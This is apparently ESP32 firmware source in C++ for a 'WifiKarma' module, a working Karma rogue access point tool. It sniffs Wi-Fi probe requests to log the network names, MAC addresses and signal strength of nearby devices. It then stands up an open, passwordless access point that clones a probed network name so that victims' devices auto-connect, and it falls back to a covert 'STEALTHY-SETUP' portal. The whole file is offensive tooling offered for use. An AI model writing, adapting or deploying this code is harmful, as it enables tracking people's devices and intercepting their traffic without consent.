#include "WifiKarma.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <algorithm>

WifiKarma* WifiKarma::_instance = nullptr;

WifiKarma::WifiKarma() {
    memset(_probes, 0, sizeof(_probes));
    _mux = portMUX_INITIALIZER_UNLOCKED;
}

// ─── Promiscuous callback ────────────────────────────────────────────────────
// Called from WiFi task context. Uses a spinlock to protect the probe array.
// Only accesses fixed-size POD data — no heap allocation.
void WifiKarma::promiscCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!_instance || !_instance->_sniffing) return;
    if (type != WIFI_PKT_MGMT) return;

    auto* pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
    const uint8_t* p = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;

    // 802.11 Management frame, Probe Request subtype:
    //   fc[0] bits 2-3 = 00 (Management), bits 4-7 = 0100 (Probe Req = 4)
    //   → fc[0] = 0b01000000 = 0x40
    if (len < 24 || p[0] != 0x40) return;

    // Address 2 = Source MAC (bytes 10-15)
    const uint8_t* srcMac = p + 10;

    // Information Elements start at byte 24
    // SSID IE: Tag=0x00, Len=1 byte, Value=SSID string
    if (len < 26) return;
    const uint8_t* ie    = p + 24;
    int            ieLen = len - 24;

    if (ie[0] != 0x00) return;
    uint8_t ssidLen = ie[1];
    if (ssidLen == 0 || ssidLen > 32) return;   // skip wildcard probes
    if (ieLen < 2 + (int)ssidLen) return;

    char ssid[33];
    memcpy(ssid, ie + 2, ssidLen);
    ssid[ssidLen] = '\0';

    int8_t  rssi = pkt->rx_ctrl.rssi;
    // Compute timestamp before entering critical section
    uint32_t now = (uint32_t)(esp_timer_get_time() / 1000ULL);  // ms, safe from any context

    portENTER_CRITICAL_ISR(&_instance->_mux);

    bool found = false;
    for (int i = 0; i < _instance->_probeCount; i++) {
        if (strncmp(_instance->_probes[i].ssid, ssid, 32) == 0) {
            _instance->_probes[i].count++;
            _instance->_probes[i].rssi     = rssi;
            _instance->_probes[i].lastSeen = now;
            found = true;
            break;
        }
    }

    if (!found && _instance->_probeCount < MAX_PROBES) {
        ProbeEntry& e = _instance->_probes[_instance->_probeCount++];
        strncpy(e.ssid, ssid, 32);
        e.ssid[32] = '\0';
        memcpy(e.mac, srcMac, 6);
        e.rssi     = rssi;
        e.lastSeen = now;
        e.count    = 1;
    }

    portEXIT_CRITICAL_ISR(&_instance->_mux);
}

// ─── Probe sniffing ──────────────────────────────────────────────────────────

void WifiKarma::startSniff() {
    if (_sniffing) return;

    _instance = this;

    // Ensure STA is available without killing any running AP
    wifi_mode_t mode = WIFI_MODE_NULL;
    esp_wifi_get_mode(&mode);
    if (mode == WIFI_MODE_NULL)    WiFi.mode(WIFI_STA);
    else if (mode == WIFI_MODE_AP) WiFi.mode(WIFI_AP_STA);

    // Filter: only management frames
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promiscCallback);

    _sniffing = true;
    Serial.println("[WifiKarma] probe sniff started");
}

void WifiKarma::stopSniff() {
    if (!_sniffing) return;

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);

    _sniffing = false;
    Serial.printf("[WifiKarma] probe sniff stopped — %d unique SSIDs\n", _probeCount);
}

// ─── Karma AP ────────────────────────────────────────────────────────────────

bool WifiKarma::startKarma(const String& ssid) {
    if (ssid.isEmpty()) return false;

    stopSniff();   // can't sniff and karma simultaneously (share promiscuous mode)

    // Ensure AP is available
    wifi_mode_t mode = WIFI_MODE_NULL;
    esp_wifi_get_mode(&mode);
    if (mode == WIFI_MODE_NULL || mode == WIFI_MODE_STA)
        WiFi.mode(WIFI_AP_STA);

    // Open AP with cloned SSID — no password, channel 6
    bool ok = WiFi.softAP(ssid.c_str(), nullptr, 6, false, 8);
    if (!ok) {
        Serial.println("[WifiKarma] softAP failed");
        return false;
    }

    _karmaSsid     = ssid;
    _karmaRunning  = true;
    Serial.println("[WifiKarma] karma active: " + ssid);
    return true;
}

void WifiKarma::stopKarma() {
    if (!_karmaRunning) return;

    // Restore original portal SSID
    WiFi.softAP("STEALTHY-SETUP", nullptr, 6, false, 4);

    _karmaRunning = false;
    _karmaSsid    = "";
    Serial.println("[WifiKarma] karma stopped, AP restored");
}

// ─── Data access ─────────────────────────────────────────────────────────────

std::vector<ProbeEntry> WifiKarma::getProbes() const {
    std::vector<ProbeEntry> result;

    portENTER_CRITICAL(&_mux);
    for (int i = 0; i < _probeCount; i++)
        result.push_back(_probes[i]);
    portEXIT_CRITICAL(&_mux);

    std::sort(result.begin(), result.end(),
        [](const ProbeEntry& a, const ProbeEntry& b) {
            return a.count > b.count;
        });

    return result;
}

int WifiKarma::getProbeCount() const {
    portENTER_CRITICAL(&_mux);
    int n = _probeCount;
    portEXIT_CRITICAL(&_mux);
    return n;
}

void WifiKarma::clearProbes() {
    portENTER_CRITICAL(&_mux);
    _probeCount = 0;
    memset(_probes, 0, sizeof(_probes));
    portEXIT_CRITICAL(&_mux);
    Serial.println("[WifiKarma] probes cleared");
}
